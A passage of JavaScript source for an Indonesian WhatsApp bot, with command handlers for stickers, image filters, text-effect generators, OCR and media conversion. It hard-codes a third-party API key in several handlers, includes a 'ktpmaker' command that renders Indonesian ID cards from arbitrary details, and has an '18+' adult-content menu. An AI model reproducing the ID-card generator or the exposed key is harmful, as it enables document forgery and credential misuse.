                 await limitAdd(sender)
				 break
			 case 'hsdxd':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				 data = fs.readFileSync('./IXBTEAM/highschooldxd.js');
                 jsonData = JSON.parse(data);
                 rannikdex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[rannikdex];
                 highschooldxd = await getBuffer(randKey.result)
                 client.sendMessage(from, highschooldxd, image, {quoted: mek})
                 await limitAdd(sender)
				 break
			case 'animesaran':
				if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                         client.sendMessage(from, animesaran(prefix), text)
                         break
			case 'husbu2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
					 data = fs.readFileSync('./IXBTEAM/husbu.js');
        		         jsonData = JSON.parse(data);
		                 rannikdex = Math.floor(Math.random() * jsonData.length);
		                 randKey = jsonData[rannikdex];
		                hasil = await getBuffer(randKey.image)
		                sendImage(hasil, mek, randKey.teks)
					    await limitAdd(sender)
				        break

///CREATOR MENU
             case 'quotemaker':
				    if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					gh = `${body.slice(12)}`
					quote = gh.split("/")[0];
					wm = gh.split("/")[1];
					bg = gh.split("/")[2];
					pref = `Usage: \n${prefix}quotemaker teks/watermark/theme\n\nEx :\n${prefix}quotemaker ini contoh/bicit/random`
					if (args.length < 1) return reply(pref)
					reply(mess.wait)
					anu = await fetchJson(`https://terhambar.com/aw/qts/?kata=${quote}&author=${wm}&tipe=${bg}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender) 
					break 
            case 'nulis':
			case 'tulis':
				    client.updatePresence(from, Presence.composing)
				    if (!isRegistered) return reply(mess.only.userB)
				    if (isBanned) return reply(mess.only.benned)
				    if (isLimit(sender)) return reply(mess.limituser)
			        if (args.length < 1) return reply('bot harus nulis apa kak??')
			        reply(mess.wait)
					tulis = body.slice(7)
				    nama = tulis.split("/")[0];
					kelas = tulis.split("/")[1];
					isi = tulis.split("/")[2];
					nulis = await getBuffer(`https://api.zeks.me/api/magernulis?nama=${nama}&kelas=${kelas}&text=${isi}&tinta=4`, {method: 'get'})
					client.sendMessage(from, nulis, image, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'nulis2':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
					if (!isPremium) return reply(mess.only.premium)
                    if (args.length < 1) return reply('Textnya mana kak?')
					reply(mess.wait)
                    tahtay = `${body.slice(7)}`
                    buff = await getBuffer(`http://api.lolhuman.xyz/api/nulis?apikey=${LolApi}&text=${tahtay}`, {method: 'get'})
                    client.sendMessage(from, buff, image, {quoted: mek, caption: `Nih pemalas`})
                    await limitAdd(sender) 
                    break 
				case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'attp':
				case 'attp2':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
					reply(mess.wait)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/${command}?apikey=${LolApi}&text=${encodeURIComponent(ini_txt)}`)
                    client.sendMessage(from, ini_buffer, sticker, { quoted: mek })
                    await limitAdd(sender)
                    break
				case 'listgroup':
				case 'grouplist':
				    ingfoo = await getGroup(totalchat)
				    teksyaw = `*L I S T  G R O U P*\n\n`
				    for (let i = 0; i < ingfoo.length; i++){
					teksyaw += `═════════════════\n*• Nama Grup :* ${ingfoo[i].subject}\n*• ID Grup :* ${ingfoo[i].id}\n*• Dibuat :* ${moment(`${ingfoo[i].creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*• Jumlah Peserta :* ${ingfoo[i].participants.length}\n`
				    }
					teksyaw += `═════════════════`
					teksyaw += `\nTotal: ${ingfoo.length}`
				    reply(teksyaw)
				   break 
			case 'amongus':
			    	if (!isRegistered) return reply(mess.only.userB)
			     	if (isBanned) return reply(mess.only.benned)
			    	if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nContoh: ${prefix + command} IXB BOT`)
                    reply(mess.wait)
					buffer = await getBuffer(`http://api.lolhuman.xyz/api/amongus?apikey=${LolApi}&text=${body.slice(9)}`)
                    client.sendMessage(from, buffer, sticker, { quoted: mek})
                    break
    case 'removebg':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
		    if (!isPremium) return reply(mess.only.premium)
	        var imgbb = require('imgbb-uploader')
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	        ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	        owgi = await client.downloadAndSaveMediaMessage(ted)
	        tels = body.slice(10)
			reply(mess.wait)
	        anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
	        hehe = await getBuffer(`http://api.lolhuman.xyz/api/removebg?apikey=${LolApi}&img=${anu.display_url}`)
	        client.sendMessage(from, hehe, image, {quoted: mek}).then(() => {
			fs.unlinkSync(owgi)
			}) 
	        } else {
	        reply('Foto aja mas')
	        }
	        break	
	case 'imageflip':
	case 'flip':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			if (!isPremium) return reply(mess.only.premium)
        	var imgbb = require('imgbb-uploader')
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	        ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	        reply(mess.wait)
	        owgi = await client.downloadAndSaveMediaMessage(ted)
	        tels = body.slice(11)
	        anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
	        hehe = await getBuffer(`http://api.lolhuman.xyz/api/editor/flip?apikey=${LolApi}&img=${anu.display_url}`)
	        client.sendMessage(from, hehe, image, {quoted: mek, caption: 'Nih kak'}).then(() => {
			fs.unlinkSync(owgi)
			})
	        } else {
	        reply('Jangan tambah kan apapun pada command')
         	}
	        break
	case 'fisheye':
	    	if (!isRegistered) return reply(mess.only.userB)
	    	if (isBanned) return reply(mess.only.benned)
	    	if (isLimit(sender)) return reply(mess.limituser)
	    	if (!isPremium) return reply(mess.only.premium)
	    	reply(mess.wait)
	        var imgbb = require('imgbb-uploader')
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	        ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	        owgi = await client.downloadAndSaveMediaMessage(ted)
	        tels = body.slice(9)
	        anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
	        hehe = await getBuffer(`http://api.lolhuman.xyz/api/editor/fisheye?apikey=${LolApi}&img=${anu.display_url}`)
	        client.sendMessage(from, hehe, image, {quoted: mek}).then(() => {
			fs.unlinkSync(owgi)
			})
	        } else {
	        reply('Foto aja mas')
	        }
	        break
	case 'grayscale':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		if (!isPremium) return reply(mess.only.premium)
		reply(mess.wait)
	    var imgbb = require('imgbb-uploader')
	    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	    ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	    owgi = await client.downloadAndSaveMediaMessage(ted)
    	tels = body.slice(11)
    	anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
	    hehe = await getBuffer(`http://api.lolhuman.xyz/api/editor/grayscale?apikey=${LolApi}&img=${anu.display_url}`)
	    client.sendMessage(from, hehe, image, {quoted: mek}).then(() => {
		fs.unlinkSync(owgi)
		})
	    } else {
	    reply('Foto aja mas')
	    }
	    break
  case 'imgtourl':
	        if (!isRegistered) return reply(mess.only.userB)
        	if (isBanned) return reply(mess.only.benned)
        	if (isLimit(sender)) return reply(mess.limituser)
			var imgbb = require('imgbb-uploader')
			reply(mess.wait)
            encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	    	jnckk = await  client.downloadAndSaveMediaMessage(encmedia)
	    	imgbb("f8978995fb109cc5487b6183f5ef56bd", jnckk)
	    	.then(data => {
	       	caps = `*「 IMAGE TO URL 」*

*• ID :* ${data.id}
*• MimeType :* ${data.image.mime}
*• Extension :* ${data.image.extension}
*• URL :* ${data.display_url}`
	    	ibb = fs.readFileSync(jnckk)
	    	client.sendMessage(from, ibb, image, { quoted: mek, caption: caps }).then(() => {
			fs.unlinkSync(jnckk)
			})
	    	})
	      	.catch(err => {
	    	throw err 
	    	})
	    	break
	case 'pixelate':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		if (!isPremium) return reply(mess.only.premium)
		reply(mess.wait)
	    var imgbb = require('imgbb-uploader')
	    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
        ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	    owgi = await client.downloadAndSaveMediaMessage(ted)
	    anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
	    hehe = await getBuffer(`http://api.lolhuman.xyz/api/editor/pixelate?apikey=${LolApi}&img=${anu.display_url}`)
	    client.sendMessage(from, hehe, image, {quoted: mek}).then(() => {
		fs.unlinkSync(owgi)
		})
	    } else {
	    reply('Foto aja mas')
	    }
	    break
	            case '1977':
                case 'aden':
                case 'brannan':
                case 'brooklyn':
                case 'clarendon':
                case 'gingham':
                case 'hudson':
                case 'inkwell':
                case 'earlybird':
                case 'kelvin':
                case 'lark':
                case 'lofi':
                case 'maven':
                case 'mayfair':
                case 'moon':
                case 'nashville':
                case 'perpetua':
                case 'reyes':
                case 'rise':
                case 'slumber':
                case 'stinson':
                case 'toaster':
                case 'valencia':
                case 'walden':
                case 'willow':
                case 'xpro2':
				     	if (!isRegistered) return reply(mess.only.userB)
		                if (isBanned) return reply(mess.only.benned)
		                if (isLimit(sender)) return reply(mess.limituser)
		                if (!isPremium) return reply(mess.only.premium)
						var imgbb = require('imgbb-uploader')
                     	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                    ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                    reply(mess.wait)
	                    owgi = await client.downloadAndSaveMediaMessage(ted)
	                    anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
						hehe = await getBuffer(`https://api.lolhuman.xyz/api/filter/${command}?apikey=${LolApi}&img=${anu.display_url}`)
						client.sendMessage(from, hehe, image, {quoted: mek}).then(() => {
						fs.unlinkSync(owgi)
						})
						} else {
						reply('Kirim gambar dengan caption atau tag gambar yang sudah dikirim')
						}
                    break
                case 'pencil':
				    	if (!isRegistered) return reply(mess.only.userB)
		                if (isBanned) return reply(mess.only.benned)
		                if (isLimit(sender)) return reply(mess.limituser)
						var imgbb = require('imgbb-uploader')
						if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					    ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
					    reply(mess.wait)
					    owgi = await client.downloadAndSaveMediaMessage(ted)
					    anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
					    hehe = await getBuffer( `http://api.lolhuman.xyz/api/editor/pencil?apikey=${LolApi}&img=${anu.display_url}`)
                        client.sendMessage(from, hehe, image, {quoted: mek}).then(() => {
						fs.unlinkSync(owgi)
						})
						} else {
						reply('Kirim gambar dengan caption atau tag gambar yang sudah dikirim')
						}
                    break 
                case '8bit':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    pllq = `${body.slice(6)}`
                    ploq = pllq.split("/")[0];
			        plo2q = pllq.split("/")[1];
                    const preffkq = `Usage: ${prefix + command} text\nExample: ${prefix + command} IvAn Bot`
					if (args.length < 1) return reply(preffkq)
                    buff = await getBuffer(`https://videfikri.com/api/textmaker/8bit/?text1=${ploq}&text2=${plo2q}`, {method: 'get'})
                    client.sendMessage(from, buff, image, {quoted: mek, caption: `Nih Anjim`})
                    await limitAdd(sender) 
                    break
			
 // Textprome //
                case 'blackpinktext':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
					reply(mess.wait)
                    ini_txt = args.join(" ")
                    getBuffer(`http://api.lolhuman.xyz/api/textprome/blackpink?apikey=${LolApi}&text=${ini_txt}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
					if (!isPremium) return reply(mess.only.premium)
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
					reply(mess.wait)
                    ini_txt = args.join(" ")
                    getBuffer(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=${LolApi}&text=${ini_txt}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break
                case 'pornhubtext':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
		            if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
					reply(mess.wait)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`http://api.lolhuman.xyz/api/textprome2/pornhub?apikey=${LolApi}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
					reply(mess.wait)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`http://api.lolhuman.xyz/api/textprome2/${command}?apikey=${LolApi}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break

// Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
                    ini_txt = args.join(" ")
					reply(mess.wait)
                    getBuffer(`http://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${LolApi}&text=${ini_txt}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
                    txt1 = args[0]
                    txt2 = args[1]
					reply(mess.wait)
                    getBuffer(`http://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${LolApi}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break

// Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn BOT`)
                    ini_txt = args.join(" ")
					reply(mess.wait)
                    getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${LolApi}&text=${ini_txt}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break
               case 'ocr':
					    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply('Foto aja gan Jangan Video')
					}
					await limitAdd(sender) 
					break 
			
			case 'sticker2':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await client.downloadAndSaveMediaMessage(encmedia)
                        file_name = getRandom('.webp')
                        request({
                            url: `http://api.lolhuman.xyz/api/convert/towebp?apikey=${LolApi}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath)
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            client.sendMessage(from, ini_buff, sticker, { quoted: mek }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker2 atau tag gambar yang sudah dikirim`)
                    }
                    break
                case 'stickerwm': 
				case 'stikerwm':
				    if (!isPremium) return reply(mess.only.premium)
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
                    if (args.length == 0) return reply(`Example: ${prefix + command} IvAn|BOT`)
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					var image_buffer = await client.downloadMediaMessage(encmedia);
					var ini_txt = args.join(" ").split("|")
					var formdata = new FormData()
					formdata.append('package',  ini_txt[0])
					formdata.append('author',  ini_txt[1])
					formdata.append('img', image_buffer, { filename: 'tahu.jpg' })
					Axios.post(`https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${LolApi}`, formdata.getBuffer(), { headers: { "content-type": `multipart/form-data; boundary=${formdata._boundary}` }, responseType: 'arraybuffer' }).then((res) => {
						client.sendMessage(from, res.data, sticker)
					})
				    } else {
					reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
				    }
				break
                case 'takestick':
				case 'takestiker':
				case 'takesticker':
				    	if (!isPremium) return reply(mess.only.premium)
                        if ((isMedia && !mek.message.videoMessage || isQuotedSticker)) {
                        if (args.length == 0) return reply(`Example: ${prefix + command} IvAn|BOT`)
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						var image_buffer = await client.downloadMediaMessage(encmedia);
                        var ini_txt = args.join(" ").split("|")
                        var formdata = new FormData()
                        formdata.append('package', ini_txt[0])
                        formdata.append('author', ini_txt[1])
                        formdata.append('img', image_buffer, { filename: 'tahu.jpg' })
                        Axios.post(`https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${LolApi}`, formdata.getBuffer(), { headers: { "content-type": `multipart/form-data; boundary=${formdata._boundary}` }, responseType: 'arraybuffer' }).then((res) => {
                            client.sendMessage(from, res.data, sticker)
                        })
                    } else { 
                        reply(`Tag sticker yang sudah dikirim`)
                    }
					break
				case 'triggered':
						if (!isRegistered) return reply(mess.only.userB)
		                if (isBanned) return reply(mess.only.benned)
		                if (isLimit(sender)) return reply(mess.limituser)
		                if (!isPremium) return reply(mess.only.premium)
		                reply(mess.wait)
						ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
						owgi = await client.downloadMediaMessage(ted)
						res = await upload(owgi)
						ini_buffer = await getBuffer(`https://some-random-api.ml/canvas/triggered?avatar=${res}`)
						await client.sendMessage(from, ini_buffer, image, { quoted: mek })
			        	break
			case 'wasted':
				    if (!isRegistered) return reply(mess.only.userB)
				    if (isBanned) return reply(mess.only.benned)
				    if (isLimit(sender)) return reply(mess.limituser)
				    boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
				    reply(mess.wait)
				    owgi = await client.downloadMediaMessage(boij)
				    res = await upload(owgi)
					amjay = await getBuffer(`https://some-random-api.ml/canvas/wasted?avatar=${res}`)
					client.sendMessage(from, amjay, image, {quoted:mek})
                    break 
        case 'tomp3':
			    	if (!isRegistered) return reply(mess.only.userB)
			    	if (isBanned) return reply(mess.only.benned)
			    	if (isLimit(sender)) return reply(mess.limituser)
					const { toAudio } = require('./lib/converter')
					reply(mess.wait)
					encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
					bufferlkj = fs.readFileSync(ran)
					client.sendMessage(from, bufferlkj, audio, {mimetype: 'audio/mp4', quoted: mek})
					fs.unlinkSync(ran)
					})
					await limitAdd(sender) 
					break 
        case 'toimg':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isQuotedSticker) return reply('Reply stickernya gan!')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran= getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return reply(' Gagal, pada saat mengkonversi sticker ke gambar ')
					buffer = fs.readFileSync(ran)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Success convert sticker to image!'})
					fs.unlinkSync(ran)
					})
					await limitAdd(sender) 
					break 
		case 'togif':
        case 'tomp4':
			    	if (!isRegistered) return reply(mess.only.userB)
			    	if (isBanned) return reply(mess.only.benned)
			    	if (isLimit(sender)) return reply(mess.limituser)
                    if (!isQuotedSticker) return reply('Reply stickernya gan!')
					reply(mess.wait)
					anumedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					owgi = await client.downloadAndSaveMediaMessage(anumedia)
					webp2mp4File(owgi).then(res=>{
					sendMediaURL(from,res.result)
					fs.unlinkSync(owgi)
					})
					limitAdd(sender)
                    break 
            case 'ktpmaker':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
					if (!isPremium) return reply(mess.only.premium)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image ( untuk rubah foto ke url silahkan upload foto dengan caption ${prefix}imgtourl )\n\nExample: ${prefix + command} 456127893132123|daerah istimewa yogyakarta|sleman|owner gans|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|gatau|gatau males|alhamdulillah islam|jomblo kack|ngebot|indonesia|unlimited|https://i.ibb.co/PrLdfrx/dsgrsgdrsgrs.png`)
					reply(mess.wait)
					get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/ktpmaker?apikey=${LolApi}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    client.sendMessage(from, buffer, image, { quoted: mek })
                    break
                    
///18+MENU
            case 'asupan':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
		            if (!isPremium) return reply(mess.only.premium)
				/*  get_result = await fetchJson(`http://api.lolhuman.xyz/api/asupan?apikey=${LolApi}`)
                    ini_buffer = await getBuffer(get_result.result)
                    client.sendMessage(from, ini_buffer, video, { quoted: mek, mimetype: Mimetype.mp4, filename: "asupan.mp4", caption: '\`\`\`ASUPAN GAN:V\`\`\`' })
                   */
					data = fs.readFileSync('./IXBTEAM/asupan.js');
					asupan = JSON.parse(data);
					yaw = Math.floor(Math.random() * asupan.length);
					randKey = asupan[yaw];
				//	asupan = await getBuffer(randKey.result)
					asupan = await getBuffer('https://telegra.ph/file/88ca24baf2d26fa2e6805.mp4')
					client.sendMessage(from, asupan, video, { quoted: mek, caption: '\`\`\`ASUPAN GAN:V\`\`\`' })
					await limitAdd(sender) 
                    break 
			case 'kodenuklir':
				    if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					tod = await getBuffer(`https://i.ibb.co/FKmPrxB/images-2020-03-19-T101230-673.jpg`)
				    client.sendMessage(from, tod, image, { quoted: mek, caption: kodenuklir()})
				    break
			case 'kodenuklir2':
				    if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					client.sendMessage(from, kodenuklir2(), { quoted: mek})
					break
            case 'nekopoi':
			    	if (!isRegistered) return reply(mess.only.userB)
			    	if (isBanned) return reply(mess.only.benned)
			    	if (isLimit(sender)) return reply(mess.limituser)
			        if (!isNsfw) return reply(' *FALSE* ')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nekopoi?apikey=${LolApi}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.anime}\n` 
                    ini_txt += `Porducers : ${get_result.producers}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Size : ${get_result.size}\n`
                    ini_txt += `Sinopsis : ${get_result.sinopsis}\n`
                    link = get_result.link
